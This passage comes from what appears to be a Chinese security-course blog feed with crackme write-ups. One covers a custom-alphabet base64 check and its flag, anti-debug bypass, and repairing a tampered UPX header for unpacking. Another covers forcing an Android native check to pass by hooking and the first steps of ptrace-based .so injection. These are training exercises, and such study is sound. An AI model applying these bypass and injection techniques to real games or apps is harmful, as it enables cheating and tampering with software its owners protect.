--v23;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v23 );<br>    &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到该if内有明显的base64编码特征</p><p>每次从a2中取出三个字符，依次存放在v49, v50, v51中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span><br>&#123;<br>    v8 = *a2++;<br>    --a3;<br>    *(&amp;v49 + v6++) = v8;<br>    <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">3</span> )<br>    &#123;<br>        <span class="hljs-comment">/******/</span><br>        v6 = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">while</span> ( a3 );<br></code></pre></td></tr></table></figure><p>对第一个字符取高6位作为索引查表，然后由<code>sub_8430</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v12[v49 &gt;&gt; <span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><p>对第一个字符取低两位，第二个字符取高4位，组合为6位，作为索引查表，然后由<code>sub_8430</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v9 = v49;<br>v11 = v50;<br>v41 = (<span class="hljs-number">16</span> * v9) &amp; <span class="hljs-number">0x30</span> | (v11 &gt;&gt; <span class="hljs-number">4</span>);<br>sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v14[v41]);<br></code></pre></td></tr></table></figure><p>对第二个字符取低4位，第三个字符取高两位，组合为6位，作为索引查表，然后由<code>sub_8430</code>处理 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">v13 = (v51 &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0xFFFFFFC3</span> | (<span class="hljs-number">4</span> * (v50 &amp; <span class="hljs-number">0xF</span>));<br>sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v15[v13]);<br></code></pre></td></tr></table></figure><p>对第三个字符取低6位，作为索引查表，然后由<code>sub_8430</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">v10 = v51 &amp; <span class="hljs-number">0x3F</span>;<br>sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v16[v10]);<br></code></pre></td></tr></table></figure><p>后续不足3个字符的一次此处省略分析，分析发现存在两个关键点，一是base64编码的码表<code>(char *)dword_48230</code>，二是<code>sub_8430</code>函数</p><p>base64编码结束的地址为<code>0x7D84</code></p><p><code>0x48230</code>储存的是码表的地址，未在dump的文件中，后续动态调试时分析</p><p><code>0x8430</code>处函数较为复杂，但是由于其输入简单，因此考虑在动态调试时分析</p><p>上述代码对参数字符串a2使用base64编码，分析<code>check</code>函数剩余代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">v24 = *(<span class="hljs-type">unsigned</span> __int8 *)a1;<br>v25 = a1[<span class="hljs-number">1</span>];<br>v26 = *a4;<br>v27 = *((_DWORD *)a4 + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> ( (v26 &amp; <span class="hljs-number">1</span> == <span class="hljs-number">0</span> )<br>    v27 = v26 &gt;&gt; <span class="hljs-number">1</span>;<br>v28 = v24 &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>    v25 = v24 &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>在<code>check</code>函数开始时，<code>a1[0], a1[1], a1[2]</code>均被设为0，但a1作为<code>sub_8430</code>参数，多次参入base64编码的过程，且在最后的判断中，多个值从<code>a1</code>处读取，猜测<code>a1</code>处可能储存base64编码的结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v27 )<br>&#123;<br>    v32 = -(v26 &gt;&gt; <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span> ( *v31 == *v29 )<br>    &#123;<br>    ++v32;<br>    ++v29;<br>    ++v31;<br>    <span class="hljs-keyword">if</span> ( !v32 )<br>        <span class="hljs-keyword">goto</span> LABEL_43;<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_42;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码进行字符串比较，关键判断</p><h5 id="动态调试分析"><a href="#动态调试分析" class="headerlink" title="动态调试分析"></a>动态调试分析</h5><p>根据上述动态调试分析，获得以下需要断点的位置</p><ul><li><p>getc返回地址<code>debug005+0x9E64</code></p><blockquote><p>getc处为Thumb模式，需要使用Alt+g将Thumb标准设为1进行解析</p></blockquote></li><li><p>undebug反调试函数<code>debug005+0x5AD0</code></p></li><li><p>check函数<code>debug005+0x7B50</code></p></li><li><p>base64编码结束位置<code>debug005+0x7D84</code></p></li></ul><p>需要重点分析的内存区域有：</p><ul><li><p>check函数参数寄存器<code>R0</code></p></li><li><p>check函数参数寄存器<code>R3</code></p></li><li><p>base64编码码表<code>debug005+0x48230</code></p></li></ul><p>由于dump得到的elf文件中部分地址存储的值错误，不能之间进行运行调试，因此继续对<code>CrackMe2</code>进行附加调试</p><p>按照dump过程进行附加调试，进程断下后对上述地址下断点恢复运行，随意输入字符串<code>1234567890</code></p><p>getc返回位置断下</p><img src="2023-10-16-14-07-28-image.png" title="" alt="" width="494"><p>取消断点，F9继续运行，undebug函数断下</p><img src="2023-10-16-14-09-26-image.png" title="" alt="" width="495"><p>手动将PC设到LR寄存器指向的返回地址处</p><img src="2023-10-16-14-10-33-image.png" title="" alt="" width="497"><p>F9继续运行</p><img src="2023-10-16-14-11-12-image.png" title="" alt="" width="499"><p>check函数断下，寄存器如下</p><img src="2023-10-16-16-39-43-image.png" title="" alt="" width="274"><p>记录R0寄存器的值<code>0xFFBAA758</code></p><p>查看R1地址处（a2参数），很明显为输入的字符串</p><img src="2023-10-16-16-40-18-image.png" title="" alt="" width="496"><p>R2的值（a3参数）为<code>0xA</code>，很明显为输入字符串的长度</p><p>查看R3地址处(a4参数)，<code>0x21</code></p><img src="2023-10-16-16-40-50-image.png" title="" alt="" width="493"><p>查看base64编码码表<code>debug005+0x48230</code></p><img src="2023-10-16-16-42-09-image.png" title="" alt="" width="491"><img title="" src="2023-10-16-16-43-31-image.png" alt="" width="486"><p>注意到该码表与标准base64码表不同，标准base64大写字母在前，小写字母在后，而此处相反，因此经过编码后的字符串大小写与标准base64编码相反</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;1234567890&quot;</span><br><br>alpha_table = <span class="hljs-string">&quot;\</span><br><span class="hljs-string">ABCDEFGHIJKLMNOPQRSTUVWXYZ\</span><br><span class="hljs-string">abcdefghijklmnopqrstuvwxyz\</span><br><span class="hljs-string">0123456789+/&quot;</span><br>alpha_table2 = <span class="hljs-string">&quot;\</span><br><span class="hljs-string">abcdefghijklmnopqrstuvwxyz\</span><br><span class="hljs-string">ABCDEFGHIJKLMNOPQRSTUVWXYZ\</span><br><span class="hljs-string">0123456789+/&quot;</span><br>trans = str1.maketrans(alpha_table, alpha_table2)<br><br>str1_b64 = base64.b64encode(str1.encode()).decode()<br>str1_b64_2 = str1_b64.translate(trans)<br><span class="hljs-built_in">print</span>(str1_b64)<br><span class="hljs-comment"># MTIzNDU2Nzg5MA==</span><br><span class="hljs-built_in">print</span>(str1_b64_2)<br><span class="hljs-comment"># mtiZndu2nZG5ma==</span><br></code></pre></td></tr></table></figure><p>F9运行到对输入字符串base64编码完成处<code>debug005+0x7D84</code>，查看之前记录的R0中地址处内容<code>0xFFBAA758</code></p><img src="2023-10-16-16-48-38-image.png" title="" alt="" width="492"><p>第一个值为<code>0x21</code>，根据前面的分析，可能是待比较的数据长度，第二个值为<code>0x10</code>，可能为输入字符串编码后的长度，第三个值为地址<code>0xF67450A0</code>，查看该地址处内存</p><img src="2023-10-16-17-07-13-image.png" title="" alt="" width="494"><p>地址处的值为输入字符串编码后的b64字符串<code>mtiZndu2nZG5ma==</code>，与上述测试相同，该地址<code>-0x20</code>处为另一个b64字符串<code>vgvUy2vUDeDHBwvtzwn1CML0Eq==</code>，猜测为待比较的字符串，使用base64解码测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">str2_b64 = <span class="hljs-string">&quot;vgvUy2vUDeDHBwvtzwn1CML0Eq==&quot;</span><br>str2_b64_2 = str2_b64.translate(trans)<br>str2 = base64.b64decode(str2_b64_2.encode()).decode()<br><span class="hljs-built_in">print</span>(str2)<br><span class="hljs-comment"># TencentGameSecurity</span><br></code></pre></td></tr></table></figure><p>解码得到字符串<code>TencentGameSecurity</code>，猜测可能为flag</p><p>ida继续调试，运行到第一个判断分枝</p><img src="2023-10-16-17-15-14-image.png" title="" alt="" width="502"><p>此时R2为<code>0x1C</code>，<code>vgvUy2vUDeDHBwvtzwn1CML0Eq==</code>字符串的长度</p><p>R0为<code>0x10</code>，<code>mtiZndu2nZG5ma==</code>字符串的长度</p><p>当两个字符串长度不相等时，跳转到输出<code>Wrong Answer</code>，手动修改R0寄存器为<code>0x1C</code>，跳过该判断</p><img src="2023-10-16-17-20-17-image.png" title="" alt="" width="509"><p>运行到第二个分枝，仍然手动跳过</p><img src="2023-10-16-17-24-37-image.png" title="" alt="" width="507"><p>运行到循环进行比较的位置，比较R1和R3处字符串是否相等</p><img src="2023-10-16-17-25-54-image.png" title="" alt="" width="286"><p>查看寄存器发现R1指向字符串<code>mtiZndu2nZG5ma==</code>，但R3未指向另一字符串，猜测在手动跳转时可能导致寄存器改变错误</p><p>中断进程，对上述得到的疑似flag<code>TencentGameSecurity</code>进行测试</p><img src="2023-10-16-17-34-27-image.png" title="" alt="" width="582"><p><code>Trun Answer</code>，说明确实是正确的flag</p><p>静态分析时得到一个使用base64解码乱码的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">LOAD:00048050 aDmd2vxkydlvezu DCB <span class="hljs-string">&quot;DMD2vxKYDLvezuriqND2DhP3BJfdtuWWrxe9pq==&quot;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>猜测其编码码表被替换，对其重新解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">str3_b64 = <span class="hljs-string">&quot;DMD2vxKYDLvezuriqND2DhP3BJfdtuWWrxe9pq==&quot;</span><br>str3_b64_2 = str3_b64.translate(trans)<br>str3 = base64.b64decode(str3_b64_2.encode()).decode()<br><span class="hljs-built_in">print</span>(str3)<br><span class="hljs-comment"># vgvUy2vUDeDHBwvtzwn1CML0Eq==</span><br></code></pre></td></tr></table></figure><p>解码出来的字符串是<code>vgvUy2vUDeDHBwvtzwn1CML0Eq==</code>，再解码一次就是flag<code>TencentGameSecurity</code></p><h3 id="upx-d脱壳"><a href="#upx-d脱壳" class="headerlink" title="upx -d脱壳"></a>upx -d脱壳</h3><p>经过调试解压缩过程，发现该壳明显就是原版的upx,无法直接<code>upx -d</code>说明修改了，特征字段，编译一个测试文件进行加壳对照分析</p><p>使用010editor打开<code>CrackMe2</code>和对照文件，两个文件都为3个节区，理论上每个节区都存在<code>UPX!</code>关键字，搜索关键字<code>UPX!</code></p><img src="2023-10-16-17-40-06-image.png" title="" alt="" width="451"><img src="2023-10-16-17-40-29-image.png" title="" alt="" width="453"><p>发现<code>CrackMe2</code>只搜索到3个<code>UPX!</code>关键字，而对照文件有4个，对照文件中4个<code>UPX!</code>第一个分布在文件开始位置不远处，第二个位于中间位置，后两个位于文件末尾，并且后两个距离很近，而<code>CrackMe2</code>末尾处只有两个<code>UPX!</code>关键字</p><p>定位到文件末尾</p><img src="2023-10-16-17-44-28-image.png" title="" alt="" width="456"><img src="2023-10-16-17-44-55-image.png" title="" alt="" width="460"><p>将<code>CrackMe2</code>对应位置处修改为<code>UPX!</code></p><img src="2023-10-16-17-45-59-image.png" title="" alt="" width="466"><p>保存文件使用<code>upx -d</code>脱壳</p><img src="2023-10-16-17-47-27-image.png" title="" alt="" width="464"><p>脱壳成功，使用ida打开脱壳文件分析</p><img src="2023-10-16-17-48-51-image.png" title="" alt="" width="474"><img src="2023-10-16-17-49-54-image.png" title="" alt="" width="478"><p>程序的函数以及代码都能够正常分析，但是字符串未正常解析，无法快速定位，根据之前的分析可以知道字符串是在程序运行时解码生成的</p><p>尝试运行脱壳后的文件</p><img src="2023-10-16-17-52-38-image.png" title="" alt="" width="482"><p>能够正常运行，输入flag<code>TencentGameSecurity</code>后能够正确判断</p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>游戏客户端开发基础-移动篇</title>
    <link href="/2023/10/09/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-%E7%A7%BB%E5%8A%A8%E7%AF%87/"/>
    <url>/2023/10/09/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-%E7%A7%BB%E5%8A%A8%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="1-Java层分析"><a href="#1-Java层分析" class="headerlink" title="1.Java层分析"></a>1.Java层分析</h3><p>使用jadx打开题目apk，查看AndroidManifest.xml获取程序入口Activity为<code>com.example.crackme1.MainActivity</code></p><p>查看反编译的<code>MainActivity</code>类的<code>onCreate</code>方法，分析Java层逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>    <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">inflate</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(getLayoutInflater());<br>    <span class="hljs-built_in">this</span>.binding = inflate;<br>    setContentView(inflate.getRoot());<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> (Button) findViewById(C0462R.C0465id.button);<br>    <span class="hljs-built_in">this</span>.btn1 = button;<br>    button.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: com.example.crackme1.MainActivity.1</span><br>        <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>            <span class="hljs-type">EditText</span> <span class="hljs-variable">textInput</span> <span class="hljs-operator">=</span> (EditText) MainActivity.<span class="hljs-built_in">this</span>.findViewById(C0462R.C0465id.TextInput);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">Inputstr</span> <span class="hljs-operator">=</span> textInput.getText().toString();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">RetStr</span> <span class="hljs-operator">=</span> MainActivity.<span class="hljs-built_in">this</span>.stringFromJNI(Inputstr);<br>            Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, RetStr, <span class="hljs-number">0</span>).show();<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>按钮触发点击事件后，调用<code>onClick</code>方法，获取输入框的输入字符串<code>Inputstr</code>，将输入字符串<code>Inputstr</code>调用<code>stringFromJNI</code>方法，并将返回字符串<code>RetStr</code>显示为toast消息</p><p>查看处理字符串的<code>stringFromJNI</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">stringFromJNI</span><span class="hljs-params">(String str)</span>;<br><br><span class="hljs-keyword">static</span> &#123;<br>    System.loadLibrary(<span class="hljs-string">&quot;crackme1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法为native文件<code>libcrackme1.so</code>中的导出函数</p><p>使用Android Studio打开apk文件进行调试，对<code>onClick</code>方法中的<code>stringFromJNI</code>调用行下断点，开始调试运行</p><p><img src="2023-10-09-11-15-05-image.png"></p><p><img src="2023-10-09-11-15-22-image.png"></p><p>调用<code>stringFromJNI</code>前，参数寄存器v0为输入的字符串，单步跳过该行调用，查看返回值</p><p><img src="2023-10-09-11-17-23-image.png"></p><p>返回值v2寄存器为字符串<code>Wrong</code>，继续运行程序，字符串<code>wrong</code>以toast消息显示在屏幕上</p><p><img src="2023-10-09-11-18-57-image.png"></p><p><img src="2023-10-09-11-19-20-image.png"></p><p>查看logcat发现，调用<code>stringFromJNI</code>函数时程序会打印log信息<code>Str:...</code>，并且每次点击按钮调用函数时打印的字符串均不相同</p><h3 id="2-Native层分析"><a href="#2-Native层分析" class="headerlink" title="2.Native层分析"></a>2.Native层分析</h3><p>分析和调试Java层发现，程序的字符串校验功能位于native层的<code>stringFromJNI</code>函数中，该函数为<code>libcrackme1.so</code>动态库的导出函数，该库文件位于<code>crackme1/lib/armeabi-v7a/</code>目录下，因此程序需要使用支持armabi-v7a的设备运行</p><p>使用readelf工具查看<code>libcrackme1.so</code>的导出函数</p><p><img src="2023-10-09-11-27-47-image.png"></p><p><code>stringFromJNI</code>函数偏移地址为<code>0x1194</code>，函数偏移最低位为0，Arm模式执行</p><p>使用ida32打开<code>libcrackme1.so</code>文件查看<code>stringFromJNI</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">Java_com_example_crackme1_MainActivity_stringFromJNI</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> *s2; <span class="hljs-comment">// [sp+Ch] [bp-7Ch]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [sp+20h] [bp-68h] BYREF</span><br><br>  s2 = (<span class="hljs-type">char</span> *)sub_12A4(a1, a3, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  qmemcpy(s, <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">3</span>);<br>  sub_F50(<span class="hljs-number">5</span>, s);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s, s2, <span class="hljs-number">5u</span>) || (sub_1134() &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> sub_12EC(a1, <span class="hljs-string">&quot;right&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> sub_12EC(a1, <span class="hljs-string">&quot;wrong&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据反编译c代码，函数将输入字符串<code>s2</code>与<code>sub_F50</code>函数生成的字符串s进行比较，当比较结果相同时，返回字符串<code>right</code>，不同时返回结果<code>wrong</code></p><p>查看<code>sub_F50</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_F50</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r1</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [sp+8h] [bp-28h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [sp+14h] [bp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v9; <span class="hljs-comment">// [sp+2Ch] [bp-4h]</span><br><br>  v2 = time(<span class="hljs-number">0</span>);<br>  srand(v2);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a1; ++i )<br>  &#123;<br>    v5 = rand();<br>    v9 = _strlen_chk(a0123456789abcd, <span class="hljs-number">0x40</span>u);<br>    sub_2964(v5, v9);<br>    a2[i] = a0123456789abcd[v3];<br>  &#125;<br>  a2[i] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> _android_log_print(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;Crack&quot;</span>, <span class="hljs-string">&quot;Str:%s&quot;</span>, a2);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数生成一个随机字符串，并在log中打印该字符串，因此在log中看到的<code>Str:...</code>就是进行比较的字符串</p><p>在if判断中，除了比较字符串是否相等，还对<code>sub_1134</code>函数返回值进行判断，分析该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1134</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img title="" src="2023-10-09-12-09-13-image.png" alt="" width="475"><p>反编译的c代码中该函数直接返回0,但根据汇编代码，该函数内存在打印log信息的函数调用，提示<code>hook this func to return true</code>，但该分支永远不会执行，因此logcat中未查看到该log信息，按照提示，后续选择该函数进行hook，其偏移地址为<code>0x1134</code>，后续称为<code>proc</code>，函数偏移地址最低为为0，Arm模式执行</p><p>查看<code>/proc/pid/maps</code>文件查看<code>libcrackme1.so</code>内存映射信息</p><p><img src="2023-10-09-12-23-02-image.png"></p><p><code>libcrackme1.so</code>的加载基地址为<code>0xe36f0000</code>，因此<code>stringFromJNI</code>函数在内存中的地址为<code>0xe36f1194</code></p><p>ida对<code>stringFromJNI</code>和<code>proc</code>下断点，附加到<code>com.example.crackme1</code>进程进行调试</p><p>调试器附加后发现线程13032触发了SIGABRT信号，导致程序中断，如果继续运行程序将信号传送给进程，程序会崩溃无法调试，该处需要将对产生该信号的线程挂起，并忽略该信号避免该线程恢复运行</p><img src="2023-10-09-12-16-24-image.png" title="" alt="" width="290"><img src="2023-10-09-12-16-40-image.png" title="" alt="" width="293"><img src="2023-10-09-12-17-08-image.png" title="" alt="" width="294"><p>在程序输入字符串点击确认按钮，Android Studio单步执行<code>stringFromJNI</code>方法，ida在<code>stringFromJNI</code>函数入口断下，函数地址为<code>0xe36f1194</code>，与上述计算相同</p><img title="" src="2023-10-09-12-24-14-image.png" alt="" width="493"><p>运行到生成随机字符串的函数返回，strcmp之前，查看两个字符串内容</p><img title="" src="2023-10-09-12-27-51-image.png" alt="" width="491"><img title="" src="2023-10-09-12-28-08-image.png" alt="" width="485"><img title="" src="2023-10-09-12-28-27-image.png" alt="" width="482"><p>分别为生成的随机字符串和输入字符串，查看log信息</p><img title="" src="2023-10-09-12-29-33-image.png" alt="" width="479"><p>log打印的字符串为函数生成的随机字符串</p><p>断点到<code>proc</code>函数</p><img title="" src="2023-10-09-12-34-04-image.png" alt="" width="479"><p>对函数的BEQ执行进行修改，使起能够打印log信息，并在函数返回时，将返回值R0寄存器修改为1</p><img title="" src="2023-10-09-12-35-36-image.png" alt="" width="477"><p>出现<code>hook this func to return true</code>log信息，继续运行程序，使<code>stringFromJNI</code>函数返回</p><p><img src="2023-10-09-12-37-39-image.png"></p><p>smali代码中<code>stringFromJNI</code>返回<code>right</code>，继续运行程序，屏幕显示toast消息<code>right</code></p><h3 id="3-ptrace注入程序"><a href="#3-ptrace注入程序" class="headerlink" title="3.ptrace注入程序"></a>3.ptrace注入程序</h3><p>使用ptrace注入程序大致分为以下几个步骤</p><ul><li><p>使用PTRACE_ATTACH附加的进程</p></li><li><p>手动调用malloc函数在进程内分配内存</p></li><li><p>使用PTRACE_WRITE将要注入的so文件路径写入进程内存</p></li><li><p>手动调用dlopen函数将so文件加载到进程内存</p></li><li><p>使用PTRACE_CONT恢复进程运行，使用PTRACE_DETACH从进程脱离</p></li></ul><p>其中需要手动调用的函数<code>malloc</code>位于<code>libc.so</code>中，函数<code>dlopen</code>位于<code>libdl.so</code>中，使用readelf查看<code>libc.so</code>和<code>libdl.so</code>的导出信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell<br>lmipro:/ $ su<br>lmipro:/ # readelf -s -W /apex/com.android.runtime/lib/bionic/libc.so |\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">grep malloc</span><br>   536: 0002d685    76 FUNC    GLOBAL DEFAULT   17 malloc<br><br>lmipro:/ # readelf -s -W /apex/com.android.runtime/lib/bionic/libdl.so |\                                                                             <br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">grep dlopen</span><br>    19: 00001849    10 FUNC    WEAK   DEFAULT   10 dlopen<br></code></pre></td></tr></table></figure><p><code>malloc</code>函数的偏移地址为<code>0x2d685</code>，<code>dlopen</code>函数的编译地址为<code>0x1849</code>，注意到两个函数偏移地址最低位都是1，处理器在执行这两个函数时需要进入Thumb模式</p><blockquote><p>Armv7a处理器指令集指令长度为4字节，当处理器进入Thumb模式后，指令长度为2字节，或拓展长度为4字节，当PC跳转的目的地址指令最低为为1时，处理器需要进入Thumb模式，置CPSR寄存器第5位为1，当恢复arm模式时，置CPSR寄存器第5位为0</p><img title="" src="2023-10-09-12-56-17-image.png" alt="" 